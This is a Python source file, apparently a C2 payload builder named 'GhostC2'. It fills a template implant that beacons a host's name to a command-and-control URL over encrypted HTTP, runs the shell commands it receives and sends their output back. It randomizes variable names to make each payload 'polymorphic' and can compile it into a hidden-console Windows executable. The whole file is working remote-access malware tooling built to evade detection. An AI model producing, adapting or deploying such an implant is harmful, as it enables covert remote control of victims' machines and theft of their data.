import random
import string
import os
from datetime import datetime
import subprocess
import argparse

TEMPLATE = """
import requests
import socket
import time
import subprocess
import json
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_encrypt

C2_URL = "{c2_url}"
RESULT_URL = "{result_url}"

def {beacon_func}():
    {host_var} = socket.gethostname()

    while True:
        {data_var} = {{
            "hostname": {host_var},
            "payload": "idle"
        }}

        try:
            {raw_var} = json.dumps({data_var})
            {enc_var} = aes_encrypt({raw_var})
            {res_var} = requests.post(C2_URL, data={enc_var}.encode(), timeout=5)

            if {res_var}.status_code == 200:
                {resp_var} = {res_var}.json()
                {task_var} = {resp_var}.get("tasks", [])

                for {cmd_var} in {task_var}:
                    print(f"[+] Executing: {{{cmd_var}}}")
                    try:
                        {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
                        {result_var} = {out_var}.decode().strip()
                    except subprocess.CalledProcessError as e:
                        {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"

                    print(f"[>] Sending result:\\n{{{result_var}}}")

                    {result_obj} = {{
                        "hostname": {host_var},
                        "command": {cmd_var},
                        "result": {result_var}
                    }}
                    {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
                    requests.post(RESULT_URL, data={encrypted_result}.encode())

        except Exception as e:
            print(f"[!] Beacon failed: {{e}}")

        time.sleep(10)

if __name__ == "__main__":
    {beacon_func}()
"""

def rand_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_payload(c2_url, result_url, output_path):
    var_names = {
        'beacon_func': rand_name(),
        'host_var': rand_name(),
        'data_var': rand_name(),
        'raw_var': rand_name(),
        'enc_var': rand_name(),
        'res_var': rand_name(),
        'resp_var': rand_name(),
        'task_var': rand_name(),
        'cmd_var': rand_name(),
        'out_var': rand_name(),
        'result_var': rand_name(),
        'result_obj': rand_name(),
        'encrypted_result': rand_name()
    }

    filled = TEMPLATE.format(c2_url=c2_url, result_url=result_url, **var_names)

    with open(output_path, 'w') as f:
        f.write(filled)

    print(f"[+] Polymorphic payload written to: {output_path}")

def compile_to_exe(source_path):
    print(f"[+] Compiling {source_path} to .exe...")
    build_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--distpath", "builds",
        "--workpath", "builds/temp",
        "--specpath", "builds/temp",
        source_path
    ]
    subprocess.run(build_cmd)
    print("[+] Compilation complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GhostC2 Polymorphic Payload Generator")
    parser.add_argument("--exe", action="store_true", help="Compile payload to .exe using PyInstaller")
    args = parser.parse_args()

    os.makedirs("builds", exist_ok=True)

    filename = f"ghost_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
    output_path = os.path.join("builds", filename)
    generate_payload("http://localhost:8080/beacon", "http://localhost:8080/result", output_path)

    if args.exe:
        compile_to_exe(output_path)
